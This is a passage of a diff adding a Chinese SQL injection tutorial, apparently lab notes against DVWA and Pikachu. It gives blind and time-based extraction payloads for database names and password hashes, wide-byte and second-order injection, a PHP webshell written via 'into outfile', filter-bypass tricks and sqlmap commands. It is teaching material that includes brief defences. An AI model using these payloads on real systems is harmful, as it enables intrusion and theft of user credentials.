+<th style="text-align:left">input</th>
+<th>output</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">1</td>
+<td style="text-align:left">1</td>
+<td>Exists</td>
+</tr>
+<tr>
+<td style="text-align:left">2</td>
+<td style="text-align:left">&apos;</td>
+<td>Missing</td>
+</tr>
+<tr>
+<td style="text-align:left">3</td>
+<td style="text-align:left">1 and 1 = 1 #</td>
+<td>Exists</td>
+</tr>
+<tr>
+<td style="text-align:left">4</td>
+<td style="text-align:left">1 and 1 = 2 #</td>
+<td>Exists</td>
+</tr>
+<tr>
+<td style="text-align:left">5</td>
+<td style="text-align:left">1&apos; and 1 = 1 #</td>
+<td>Exists</td>
+</tr>
+<tr>
+<td style="text-align:left">6</td>
+<td style="text-align:left">1&apos; and 1 = 2 #</td>
+<td>Missing</td>
+</tr>
+</tbody>
+</table>
+<p>&#x7531;&#x8BED;&#x53E5; 5 &#x548C; 6 &#x6784;&#x9020;&#x771F;&#x5047;&#x6761;&#x4EF6;&#x8FD4;&#x56DE;&#x5BF9;&#x5E94;&#x4E0D;&#x540C;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x53EF;&#x77E5;&#x5B58;&#x5728;&#x5B57;&#x7B26;&#x578B;&#x7684; SQL &#x76F2;&#x6CE8;&#x6F0F;&#x6D1E;</p>
+<p><strong>&#x731C;&#x89E3;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;&#x957F;&#x5EA6;</strong></p>
+<p>&#x4E8C;&#x5206;&#x6CD5;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; and length(database())&gt;10#  Missing
+1&apos; and length(database())&gt;5#  Missing
+1&apos; and length(database())&gt;3#  Exists
+1&apos; and length(database())&gt;4#  Exists
+</code></pre><p><strong>&#x731C;&#x89E3;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;</strong></p>
+<p>&#x5148;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x7136;&#x540E;&#x8DDF; ascii &#x7801;&#x503C;&#x4E00;&#x4E2A;&#x4E2A;&#x5BF9;&#x6BD4;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; and ascii(substr(database(),1,1)) &gt; 88#  Exists
+1&apos; and ascii(substr(database(),1,1)) &gt; 98#  Exists
+1&apos; and ascii(substr(database(),1,1)) &gt; 100#  Missing
+1&apos; and ascii(substr(database(),1,1)) = 100#  Exists
+</code></pre><p>&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x6BCD;&#x7684; ascii &#x503C;&#x4E3A; 100&#xFF0C;&#x5B57;&#x6BCD;&#x4E3A; d</p>
+<p>&#x4EE5;&#x6B64;&#x7C7B;&#x63A8;&#xFF0C;&#x5206;&#x522B;&#x731C;&#x89E3;&#x7B2C; 2&#x3001;3&#x3001;4 &#x4F4D;&#x5143;&#x7D20;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; and ascii(substr(database(),2,1)) = 118#  &#x7B2C;&#x4E8C;&#x4F4D;&#x5B57;&#x7B26;&#x4E3A; v
+1&apos; and ascii(substr(database(),3,1)) = 119#  &#x7B2C;&#x4E09;&#x4F4D;&#x5B57;&#x7B26;&#x4E3A; w
+1&apos; and ascii(substr(database(),4,1)) = 97#  &#x7B2C;&#x56DB;&#x4F4D;&#x5B57;&#x7B26;&#x4E3A; a
+</code></pre><p>&#x4ECE;&#x800C;&#x83B7;&#x5F97;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;&#x4E3A; dvwa</p>
+<p><strong>&#x731C;&#x89E3;&#x8868;&#x4E2A;&#x6570;</strong></p>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;10#  Missing
+1&apos; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;5#  Missing
+1&apos; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;2#  Missing
+1&apos; and (select count(table_name) from information_schema.tables where table_schema=database())=2#  Exists
+</code></pre><p>dvwa &#x6570;&#x636E;&#x5E93;&#x4E2D;&#x8868;&#x4E2A;&#x6570;&#x4E3A; 2</p>
+<p><strong>&#x731C;&#x89E3;&#x8868;&#x540D;</strong></p>
+<p>&#x4EE5;&#x7B2C;&#x4E00;&#x5F20;&#x8868;&#x4E3A;&#x4F8B;</p>
+<ol>
+<li>&#x731C;&#x89E3;&#x8868;&#x540D;&#x957F;&#x5EA6;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))&gt;10#  Missing
+1&apos; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))&gt;5#  Exists
+1&apos; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))&gt;8#  Exists
+1&apos; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9#  Exists
+</code></pre><ol start="2">
+<li>&#x731C;&#x89E3;&#x8868;&#x540D;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x6BCD;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt; 88#  Exists
+1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt; 100#  Exists
+1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt; 105#  Missing
+1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt; 102#
+1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 103#  Exists
+</code></pre><p>&#x540E;&#x7EED;&#x5B57;&#x6BCD;&#x4EE5;&#x6B64;&#x7C7B;&#x63A8;</p>
+<p><strong>&#x731C;&#x89E3;&#x5B57;&#x6BB5;</strong></p>
+<p>&#x4E5F;&#x662F;&#x5148;&#x731C;&#x5B57;&#x6BB5;&#x6570;&#xFF0C;&#x7136;&#x540E;&#x731C;&#x89E3;&#x957F;&#x5EA6;&#xFF0C;&#x7136;&#x540E;&#x4E00;&#x6B21;&#x731C;&#x89E3;&#x6BCF;&#x4E2A;&#x5B57;&#x7B26;</p>
+<pre data-role="codeBlock" data-info class="language-"><code># &#x731C;&#x5B57;&#x6BB5;&#x4E2A;&#x6570;
+1&apos; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;)&gt;5#
+
+# &#x731C;&#x89E3;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x5B57;&#x7B26;&#x4E2A;&#x6570;
+1&apos; and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 0,1),1)) &gt; 5#
+
+# &#x731C;&#x89E3;&#x5B57;&#x7B26;
+1&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 0,1),1,1)) &gt; 80#
+</code></pre><p>&#x4F9D;&#x6B21;&#x5C1D;&#x8BD5;&#xFF0C;&#x6BD4;&#x8F83;&#x8D39;&#x65F6;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;&#x731C;&#x6D4B;&#x65B9;&#x6CD5;</p>
+<p><strong>&#x731C;&#x6D4B;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#x5B57;&#x6BB5;</strong></p>
+<p>&#x3010;&#x731C;&#x60F3;&#x3011;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x53EF;&#x80FD;&#x4FDD;&#x5B58;&#x7684;&#x5B57;&#x6BB5;&#x540D;&#x79F0;</p>
+<p>&#x2F64;&#x6237;&#x540D;&#xFF1A;username/user_name/uname/u_name/user/name/...<br>
+&#x5BC6;&#x7801;&#xFF1A;password/pass_word/pwd/pass/...</p>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; and (select count(1) from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; and column_name=&quot;username&quot;) = 1#  Missing
+1&apos; and (select count(1) from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; and column_name=&quot;user&quot;) = 1#  Exists
+1&apos; and (select count(1) from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; and column_name=&quot;password&quot;) = 1#  Exists
+</code></pre><p><strong>&#x83B7;&#x53D6;&#x5B57;&#x6BB5;&#x503C;</strong></p>
+<pre data-role="codeBlock" data-info class="language-"><code>#&#x5224;&#x65AD;&#x957F;&#x5EA6;
+1&apos; and (length(substr((select password from users limit 0,1),1))) &gt; 20#
+1&apos; and (length(substr((select password from users limit 0,1),1))) &gt; 35#
+1&apos; and (length(substr((select password from users limit 0,1),1))) &gt; 30#
+1&apos; and (length(substr((select password from users limit 0,1),1))) = 32#  Exists
+
+#&#x9010;&#x4E2A;&#x7834;&#x89E3;&#x5B57;&#x7B26;
+1&apos; and (ascii(substr((select password from users limit 0,1),1,1))) &gt; 40#
+1&apos; and (ascii(substr((select password from users limit 0,1),1,1))) &gt; 50#
+...
+</code></pre><h2 class="mume-header" id="%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">&#x65F6;&#x95F4;&#x76F2;&#x6CE8;</h2>
+
+<p>&#x9875;&#x9762;&#x8FD4;&#x56DE;&#x503C;&#x53EA;&#x6709;&#x4E00;&#x79CD; True&#xFF0C;&#x65E0;&#x8BBA;&#x8F93;&#x5165;&#x4F55;&#x503C;&#xFF0C;&#x8FD4;&#x56DE;&#x60C5;&#x51B5;&#x90FD;&#x6309;&#x6B63;&#x5E38;&#x6765;&#x5904;&#x7406;&#x3002;&#x6B64;&#x65F6;&#x53EF;&#x4EE5;&#x52A0;&#x5165;&#x65F6;&#x95F4;&#x51FD;&#x6570;&#xFF0C;&#x901A;&#x8FC7;&#x8FD4;&#x56DE;&#x65F6;&#x95F4;&#x90FD;&#x957F;&#x77ED;&#x6765;&#x5224;&#x65AD;&#x6CE8;&#x5165;&#x7684;&#x8BED;&#x53E5;&#x662F;&#x5426;&#x6B63;&#x786E;</p>
+<p><strong>&#x731C;&#x89E3;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;</strong></p>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; and if(length(database())=4,sleep(5),1)#
+
+# &#x6761;&#x4EF6;&#x4E3A;&#x771F;&#xFF0C;&#x7761;&#x7720; 5 s&#xFF0C;&#x6761;&#x4EF6;&#x4E3A;&#x5047;&#x8FD4;&#x56DE; 1 &#xFF08;True&#xFF09;
+</code></pre><p>&#x53EF;&#x4EE5;&#x6309; F12&#xFF0C;&#x6253;&#x5F00;&#x8C03;&#x8BD5;&#xFF0C;&#x4ECE; Network &#x4E2D;&#x67E5;&#x770B;&#xFF0C;&#x63A5;&#x53E3;&#x7528;&#x65F6;</p>
+<h2 class="mume-header" id="%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5">&#x5806;&#x53E0;&#x6CE8;&#x5165;</h2>
+
+<p>&#x901A;&#x8FC7;&#x52A0;&#x5165;&#x5206;&#x53F7; <code>;</code> &#x6784;&#x9020;&#x591A;&#x6761;&#x8BED;&#x53E5;&#x8BA9;&#x6570;&#x636E;&#x5E93;&#x6267;&#x884C;&#x3002;&#x5371;&#x5BB3;&#x6781;&#x5927;&#xFF0C;&#x589E;&#x5220;&#x6539;&#x67E5;&#x6BEB;&#x65E0;&#x9650;&#x5236;</p>
+<p><strong>&#x4F7F;&#x7528;&#x6761;&#x4EF6;</strong></p>
+<p>&#x5806;&#x53E0;&#x6CE8;&#x5165;&#x4F7F;&#x7528;&#x6761;&#x4EF6;&#x5341;&#x5206;&#x6709;&#x9650;&#xFF0C;&#x5176;&#x53EF;&#x80FD;&#x53D7;&#x5230; API &#x6216;&#x8005;&#x6570;&#x636E;&#x5E93;&#x5F15;&#x64CE;&#xFF0C;&#x53C8;&#x6216;&#x8005;&#x6743;&#x9650;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x53EA;&#x6709;&#x5F53;&#x8C03;&#x7528;&#x6570;&#x636E;&#x5E93;&#x7684;&#x51FD;&#x6570;&#x652F;&#x6301;&#x6267;&#x884C;&#x591A;&#x6761;&#x8BED;&#x53E5;&#x65F6;&#x624D;&#x80FD;&#x591F;&#x4F7F;&#x7528;</p>
+<p>&#x5229;&#x2F64; <code>mysqli_multi_query()</code> &#x51FD;&#x6570;&#x5C31;&#x2F40;&#x6301;&#x591A;&#x6761; sql &#x8BED;&#x53E5;&#x540C;&#x65F6;&#x6267;&#x2F8F;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x4E2D;&#xFF0C;&#x5982; PHP &#x4E3A;&#x4E86;&#x9632;&#x2F4C; sql &#x6CE8;&#x2F0A;&#x673A;&#x5236;&#xFF0C;&#x5F80;&#x5F80;&#x4F7F;&#x2F64;&#x8C03;&#x2F64;&#x6570;&#x636E;&#x5E93;&#x7684;&#x51FD;&#x6570;&#x662F;<code>mysqli_query()</code> &#x51FD;&#x6570;&#xFF0C;&#x5176;&#x53EA;&#x80FD;&#x6267;&#x2F8F;&#x2F00;&#x6761;&#x8BED;&#x53E5;</p>
+<h2 class="mume-header" id="%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">&#x4E8C;&#x6B21;&#x6CE8;&#x5165;</h2>
+
+<p>&#x4E00;&#x4E2A;&#x7F51;&#x7AD9;&#x5BF9;&#x6211;&#x4EEC;&#x7684;&#x8F93;&#x5165;&#x8FDB;&#x884C;&#x4E86;&#x8FC7;&#x6EE4;&#xFF0C;&#x4F8B;&#x5982;&#x8F6C;&#x4E49;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#xFF0C;&#x6211;&#x4EEC;&#x8F93;&#x5165;&#x7684; <code>1&apos;</code> &#x88AB;&#x8F6C;&#x4E49;&#x4E3A; <code>1\&apos;</code>&#x3002;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x63D2;&#x5165;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x540E;&#x7AEF;&#x4EC5;&#x4EC5;&#x4F7F;&#x7528;&#x4E86; <code>addslashes</code> &#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#xFF0C;&#x6570;&#x636E;&#x63D2;&#x5165;&#x6570;&#x636E;&#x5E93;&#x65F6;&#xFF0C;<code>\</code> &#x4F1A;&#x88AB;&#x81EA;&#x52A8;&#x6458;&#x9664;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x4FDD;&#x5B58;&#x7684;&#x662F;&#x539F;&#x59CB;&#x4FE1;&#x606F;&#x3002;&#x6211;&#x4EEC;&#x518D;&#x901A;&#x8FC7;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;&#x8BBF;&#x95EE;&#x8FD9;&#x6BB5;&#x6570;&#x636E;&#xFF0C;&#x5F15;&#x5BFC;&#x6076;&#x610F;&#x6307;&#x4EE4;&#x88AB;&#x6267;&#x884C;</p>
+<p>&#x4E8C;&#x6B21;&#x6CE8;&#x5165;&#x7684;&#x4E24;&#x4E2A;&#x6B65;&#x9AA4;</p>
+<ol>
+<li>&#x63D2;&#x5165;&#x6076;&#x610F;&#x6570;&#x636E;</li>
+<li>&#x5F15;&#x7528;&#x6076;&#x610F;&#x6570;&#x636E;</li>
+</ol>
+<p>&#x4F8B;&#x5B50;&#xFF1A;</p>
+<ol>
+<li>&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x5199;&#x5165;&#x6570;&#x636E;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x8F93;&#x5165;&#x6076;&#x610F;&#x4FE1;&#x606F;&#x4F8B;&#x5982; <code>1&apos;</code></li>
+<li>&#x6570;&#x636E;&#x88AB;&#x8F6C;&#x4E49;&#x6210; <code>1\&apos;</code></li>
+<li>&#x6570;&#x636E;&#x88AB;&#x5B58;&#x5165;&#x6570;&#x636E;&#x5E93;&#x540E;&#x4E3A; <code>1&apos;</code></li>
+<li>&#x627E;&#x5230;&#x53E6;&#x4E00;&#x5904;&#x5F15;&#x7528;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x7684;&#x64CD;&#x4F5C;</li>
+<li>&#x6570;&#x636E;&#x88AB;&#x53D6;&#x51FA;&#xFF0C;&#x4F46;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x8FC7;&#x6EE4; <code>1&apos;</code></li>
+<li>&#x6CE8;&#x5165;&#x53D1;&#x751F; <code>insert into table values(&apos;1&apos;&apos;)</code></li>
+</ol>
+<h2 class="mume-header" id="%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;</h2>
+
+<p>&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x2F0A;&#x65F6;&#x5229;&#x2F64; mysql &#x7684;&#x2F00;&#x4E2A;&#x7279;&#x6027;&#xFF0C;&#x4F7F;&#x2F64; GBK &#x7F16;&#x7801;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x8BA4;&#x4E3A;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x662F;&#x2F00;&#x4E2A;&#x6C49;&#x5B57;</p>
+<p><strong>addslashes &#x51FD;&#x6570;</strong></p>
+<p><code>addslashes()</code> &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x5728;&#x9884;&#x5B9A;&#x4E49;&#x5B57;&#x7B26;&#x4E4B;&#x524D;&#x6DFB;&#x52A0;&#x53CD;&#x659C;&#x6760; <code>\</code> &#x7684;&#x5B57;&#x7B26;&#x4E32;</p>
+<p>&#x9884;&#x5B9A;&#x4E49;&#x5B57;&#x7B26;</p>
+<ul>
+<li>&#x5355;&#x5F15;&#x53F7;&#xFF08;&apos;&#xFF09;</li>
+<li>&#x53CC;&#x5F15;&#x53F7;&#xFF08;&quot;&#xFF09;</li>
+<li>&#x53CD;&#x659C;&#x6760;&#xFF08;\&#xFF09;</li>
+<li>NULL</li>
+</ul>
+<p>&#x5B57;&#x7B26;&#x578B;&#x7684;&#x6CE8;&#x5165;&#x70B9;&#x6211;&#x4EEC;&#x90FD;&#x662F;&#x7528;&#x5355;&#x5F15;&#x53F7;&#x6765;&#x5224;&#x65AD;&#x7684;&#xFF0C;&#x5F53;&#x9047;&#x5230; <code>addslashes()</code> &#x65F6;&#xFF0C;&#x5355;&#x5F15;&#x53F7;&#x4F1A;&#x88AB;&#x8F6C;&#x4E49;&#xFF0C;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x7528;&#x6765;&#x5224;&#x65AD;&#x6CE8;&#x5165;&#x70B9;&#x7684;&#x5355;&#x5F15;&#x53F7;&#x5931;&#x6548;&#x3002;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x7684;&#x5C31;&#x662F;&#x4F7F;&#x8F6C;&#x4E49;&#x7B26; <code>\</code> &#x5931;&#x6548;&#xFF0C;&#x662F;&#x5355;&#x5F15;&#x53F7;&#x9003;&#x9038;</p>
+<p><strong>&#x6CE8;&#x5165;&#x539F;&#x7406;</strong></p>
+<pre data-role="codeBlock" data-info class="language-"><code>#&#x6076;&#x610F;&#x4EE3;&#x7801;
+kobe%df&apos; or 1=1#
+
+#&#x8F6C;&#x4E49;&#x540E;
+kobe%df\&apos; or 1=1#
+
+#Ascii&#x7801;
+%5c = \
+%27 = &apos;
+
+#&#x6240;&#x4EE5;&#x7B49;&#x6548;&#x4E8E;
+kobe%df%5c%27 or 1=1#
+
+# &#x56E0;&#x4E3A;
+%df%5c &#x662F; GBK &#x5B57;&#x7B26; &#x904B;&#xFF0C;&#x88AB;&#x4E00;&#x8D77;&#x89E3;&#x6790;&#x4E86;&#xFF0C;%27 &#x9003;&#x9038;
+
+# &#x6700;&#x7EC8;&#x7B49;&#x6548;&#x4EE3;&#x7801;
+kobe&#x904B;&apos; or 1=1#
+</code></pre><p><strong>&#x9776;&#x673A;&#x73AF;&#x5883;</strong></p>
+<pre data-role="codeBlock" data-info class="language-"><code>docker pull area39/pikachu
+docker run -d -p 80:80 area39/pikachu
+</code></pre><p>&#x4F7F;&#x7528; Burp Suit &#x6D4B;&#x8BD5;&#x6CE8;&#x5165;</p>
+<h2 class="mume-header" id="http-header-%E5%92%8C-cookie-%E6%B3%A8%E5%85%A5">http header &#x548C; cookie &#x6CE8;&#x5165;</h2>
+
+<p>http header &#x548C; cookie &#x4FE1;&#x606F;&#xFF0C;&#x540E;&#x6BB5;&#x901A;&#x5E38;&#x4F1A;&#x63D0;&#x53D6;&#x8FD9;&#x4E9B;&#x4FE1;&#x606F;&#x6765;&#x5224;&#x65AD;&#x5BA2;&#x6237;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x540C;&#x65F6;&#x975E;&#x5E38;&#x53EF;&#x80FD;&#x540E;&#x7AEF;&#x901A;&#x8FC7;&#x8FD9;&#x4E9B;&#x4FE1;&#x606F;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8DB3;&#x591F;&#x7684;&#x5B89;&#x5168;&#x8003;&#x8651;&#xFF0C;&#x5219;&#x53EF;&#x80FD;&#x53D1;&#x751F; sql &#x6CE8;&#x5165;</p>
+<h2 class="mume-header" id="%E8%8E%B7%E5%8F%96-shell">&#x83B7;&#x53D6; Shell</h2>
+
+<p>&#x5982;&#x679C;&#x6570;&#x636E;&#x5E93;&#x548C; web &#x670D;&#x52A1;&#x5668;&#x5728;&#x540C;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x800C;&#x4E14;&#x8FD0;&#x884C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x8D26;&#x53F7;&#x6743;&#x9650;&#x8DB3;&#x591F;&#xFF0C;&#x4F8B;&#x5982; root&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5199;&#x5165;&#x4EFB;&#x610F;&#x6587;&#x4EF6;</p>
+<p>&#x4F7F;&#x7528; <code>select into outfile</code> &#x529F;&#x80FD;&#x5199;&#x5165;&#x6587;&#x4EF6;&#xFF0C;&#x5C06;&#x6728;&#x9A6C;&#x5199;&#x5165; web &#x76EE;&#x5F55;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>&apos; union select 1,&quot;&lt;?php eval($_POST[&apos;a&apos;]);&quot; into outfile &apos;/var/www/html/shell3.php
+</code></pre><h2 class="mume-header" id="sql-%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87">SQL &#x6CE8;&#x5165;&#x7ED5;&#x8FC7;</h2>
+
+<p><strong>&#x5927;&#x5C0F;&#x5199;&#x7ED5;&#x8FC7;</strong></p>
+<p>&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#x53EA;&#x9488;&#x5BF9;&#x5927;&#x5199;&#x6216;&#x8005;&#x5C0F;&#x5199;&#xFF0C;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F; /express/i &#x5927;&#x5C0F;&#x5199;&#x4E0D;&#x654F;&#x611F;&#x65E0;&#x6CD5;&#x7ED5;&#x8FC7;</p>
+<p>&#x4F8B;&#x5B50;&#xFF1A;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4
+</code></pre><p><strong>&#x66FF;&#x6362;&#x5173;&#x952E;&#x5B57;</strong></p>
+<p>&#x5982;&#x679C;&#x53EA;&#x66FF;&#x6362;&#x4E00;&#x6B21;&#xFF0C;&#x5C31;&#x5F88;&#x5BB9;&#x6613;&#x7ED5;&#x8FC7;</p>
+<p>&#x4F8B;&#x5B50;&#xFF1A;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4
+</code></pre><p><strong>&#x4F7F;&#x7528;&#x7F16;&#x7801;</strong></p>
+<ol>
+<li>URL &#x7F16;&#x7801;</li>
+<li>&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7F16;&#x7801;</li>
+<li>Unicode &#x7F16;&#x7801;</li>
+<li>&#x4F7F;&#x7528;&#x6CE8;&#x91CA;
+<ul>
+<li>&#x666E;&#x901A;&#x6CE8;&#x91CA; <code>#</code>, <code>--</code>, <code>/**/</code></li>
+<li>&#x5185;&#x8054;&#x6CE8;&#x91CA; <code>/*!*/</code></li>
+</ul>
+</li>
+</ol>
+<p><strong>&#x7B49;&#x4EF7;&#x51FD;&#x6570;&#x4E0E;&#x547D;&#x4EE4;</strong></p>
+<p>&#x6709;&#x4E9B;&#x51FD;&#x6570;&#x6216;&#x547D;&#x4EE4;&#x56E0;&#x5176;&#x5173;&#x952E;&#x5B57;&#x88AB;&#x68C0;&#x6D4B;&#x51FA;&#x6765;&#x800C;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#xFF0C;&#x6B64;&#x65F6;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E0E;&#x4E4B;&#x7B49;&#x4EF7;&#x90FD;&#x51FD;&#x6570;&#x4EE3;&#x66FF;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>hex(), bin() =&gt; ascii()
+sleep() =&gt; benchmark()
+concat_ws() =&gt; group_concat()
+mid(), substr() =&gt; substring()
+</code></pre><p>&#x7B26;&#x53F7;</p>
+<ul>
+<li><code>and</code> &#x548C; <code>or</code> &#x4E0D;&#x80FD;&#x7528;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8BD5;&#x8BD5; <code>&amp;&amp;</code> &#x548C; <code>||</code></li>
+<li><code>=</code> &#x4E0D;&#x80FD;&#x7528;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8003;&#x8651; <code>&lt;</code>  <code>&gt;</code>&#xFF0C;&#x56E0;&#x4E3A;&#x4E0D;&#x5927;&#x4E8E;&#x3001;&#x4E0D;&#x5C0F;&#x4E8E;&#x4FBF;&#x662F;&#x7B49;&#x4E8E;&#x4E86;</li>
+<li>&#x7A7A;&#x683C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; <code>%20 %09 %0a %0b %0c %0d %a0 /**/</code></li>
+</ul>
+<p><strong>&#x7279;&#x6B8A;&#x7B26;&#x53F7;</strong></p>
+<ol>
+<li>&#x53CD;&#x5F15;&#x53F7; `&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x8FC7;&#x7A7A;&#x683C;&#x548C;&#x6B63;&#x5219;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>select `database()`;
+</code></pre><ol start="2">
+<li>&#x795E;&#x5947;&#x7684; <code>+</code>, <code>-</code>&#xFF0C;&#x7528;&#x4E8E;&#x5B57;&#x7B26;&#x4E32;&#x8FDE;&#x63A5;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>select+user_id from users;
+</code></pre><ol start="3">
+<li><code>@</code> &#x7B26;&#x53F7;&#xFF0C;&#x7528;&#x4E8E;&#x53D8;&#x91CF;&#x5B9A;&#x4E49;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>select@^1.from users;
+</code></pre><h2 class="mume-header" id="sql-%E9%98%B2%E5%BE%A1">SQL &#x9632;&#x5FA1;</h2>
+
+<ol>
+<li>&#x4F7F;&#x7528; sql &#x8BED;&#x53E5;&#x9884;&#x7F16;&#x8BD1;</li>
+<li>&#x4E25;&#x683C;&#x68C0;&#x67E5;&#x53C2;&#x6570;&#x7C7B;&#x578B;</li>
+<li>&#x4F7F;&#x7528;&#x5B89;&#x5168;&#x51FD;&#x6570;</li>
+<li>&#x5F88;&#x591A; orm &#x6846;&#x67B6;&#x90FD;&#x4F7F;&#x7528;&#x4E86;&#x9884;&#x7F16;&#x8BD1; sql</li>
+</ol>
+<h2 class="mume-header" id="sqlmap">SQLmap</h2>
+
+<p><a href="http://sqlmap.org">http://sqlmap.org</a></p>
+<p><strong>&#x4ECB;&#x7ECD;</strong></p>
+<p>&#x652F;&#x6301;&#x591A;&#x79CD;&#x6570;&#x636E;</p>
+<p>&#x652F;&#x6301; 5 &#x79CD;&#x4E0D;&#x540C;&#x7684;&#x6CE8;&#x5165;&#x6A21;&#x5F0F;</p>
+<ol>
+<li>&#x5E03;&#x5C14;&#x76F2;&#x6CE8;</li>
+<li>&#x65F6;&#x95F4;&#x76F2;&#x6CE8;</li>
+<li>&#x62A5;&#x9519;&#x6CE8;&#x5165;</li>
+<li>Union &#x6CE8;&#x5165;</li>
+<li>&#x5806;&#x53E0;&#x6CE8;&#x5165;</li>
+</ol>
+<p><strong>&#x4F7F;&#x7528;&#x793A;&#x4F8B;</strong></p>
+<p>&#x5229;&#x7528; dvwa</p>
+<ol>
+<li>&#x5224;&#x65AD;&#x6CE8;&#x5165;&#x70B9;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>$ sqlmap -u &quot;http://192.168.119.129:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
+--cookie=&quot;PHPSESSID=jh23103cqh5bh33a53gelso9d1; security=low&quot; \
+-p id    # -p &#x6307;&#x5B9A;&#x53C2;&#x6570;
+</code></pre><ol start="2">
+<li>&#x83B7;&#x53D6;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;</li>
+</ol>
